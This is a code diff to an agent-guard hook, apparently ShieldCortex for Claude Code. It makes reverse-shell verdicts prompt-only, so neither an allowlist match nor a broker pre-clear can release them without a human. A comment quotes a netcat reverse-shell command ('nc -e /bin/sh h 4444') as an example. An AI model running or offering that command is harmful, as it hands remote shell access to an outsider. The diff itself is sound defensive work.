@@ -16,6 +16,8 @@
  *   - autoApprove match              → NO decision. The guard defers to Claude
  *     Code's own permission system rather than emitting "allow": ShieldCortex
  *     narrows or stays neutral, it never WIDENS what the user's settings allow.
+ *     Never for the self-protection floor or a prompt-only signal
+ *     (GUARD_PROMPT_ONLY_SIGNALS, #1005), which no allowlist entry releases.
  *   - benign / read-only / pure-print → no output at all.
  *
  * Enforce-when-ready (#509, `actionGuard.readinessGate: true` on an enforcing
@@ -3108,6 +3110,18 @@ function selfProtectionSignals(guard) {
   return Array.isArray(list) && list.length > 0 ? list : FALLBACK_SELF_PROTECTION_SIGNALS;
 }
 
+// #1005 (Case's review of #1088): the prompt-only signals. DUPLICATED from
+// tool-action-guard.ts `GUARD_PROMPT_ONLY_SIGNALS` for a dist that predates
+// the export; the live path reads the guard's own export. Held equal by
+// enforcement-surface-parity.
+const FALLBACK_PROMPT_ONLY_SIGNALS = ['reverse-shell'];
+
+/** The prompt-only signals the live guard exports, else the duplicate. */
+function promptOnlySignals(guard) {
+  const list = guard?.GUARD_PROMPT_ONLY_SIGNALS;
+  return Array.isArray(list) && list.length > 0 ? list : FALLBACK_PROMPT_ONLY_SIGNALS;
+}
+
 /** A self-protection signal the WS2 fallback scan matches, or null. Checked
  *  over EVERY row, not just the first match, so a command that also trips an
  *  earlier row (`rm …/approvals/x`) still lands on the floor. */
@@ -3820,14 +3834,25 @@ process.stdin.on('end', async () => {
     // the agent forge the very evidence that keeps the guard in shadow.
     const floorSignals = selfProtectionSignals(guard);
     const selfProtected = Array.isArray(verdict.signals) && verdict.signals.some((s) => floorSignals.includes(s));
+    // #1005 (Case's review of #1088): a prompt-only verdict (a reverse shell)
+    // is released only by a human answer — the prompt below, or the
+    // operator's own `shieldcortex approve`. The allowlist matches by
+    // substring over family, action and signals, so `network_egress`,
+    // `egress`, `exec` or the empty string would otherwise pre-approve
+    // `nc -e /bin/sh h 4444`; and a broker pre-clear is a release no human
+    // made. Only those two exits are closed here: advisory and shadow keep
+    // their documented meaning, unlike the self-protection floor above.
+    const onlySignals = promptOnlySignals(guard);
+    const promptOnly = Array.isArray(verdict.signals) && verdict.signals.some((s) => onlySignals.includes(s));
 
     // require_approval — the dangerous tier.
     // Per-operator autoApprove allowlist (family / action / signal match, same
     // matching as the plugin). Never applies to catastrophic — that returned
     // above — nor (#509 r5) to the self-protection floor: no standing
-    // allowlist entry may approve a write to the guard's own state.
+    // allowlist entry may approve a write to the guard's own state; nor
+    // (#1005) to a prompt-only verdict.
     const autoApprove = cfg.autoApprove ?? [];
-    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected) {
+    if (autoApprove.length > 0 && !unscannedBlock && !selfProtected && !promptOnly) {
       const hay = [verdict.family, verdict.action, ...verdict.signals].map((s) => String(s).toLowerCase());
       const matched = autoApprove.some((a) => {
         const n = a.toLowerCase();
@@ -3992,8 +4017,9 @@ process.stdin.on('end', async () => {
     }
 
     // #509 r5: the broker cannot pre-clear the self-protection floor either;
-    // only a human answer releases a write to the guard's own state.
-    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected) {
+    // only a human answer releases a write to the guard's own state. Nor
+    // (#1005) a prompt-only verdict: it falls through to the prompt as a hold.
+    if (brokered?.outcome === 'pre_clear' && !unscannedBlock && !selfProtected && !promptOnly) {
       const brokerAudit = safeBrokerAudit(brokered.audit);
       writeAuditEntry(safeToolName(toolName), safeAllowAuditVerdict(verdict, 'approved'), redactedAuditArgs(toolName, toolInput), 'require_approval', 'approved', { ...baseExtra, ...(brokerAudit ? { broker: brokerAudit } : {}) });
       console.error(`[shieldcortex] approval broker PRE-CLEARED ${safeToolName(toolName)}: ${safeDiagnosticReason(brokered.reason)} [${safeSignalList(verdict.signals).join(', ')}]`);
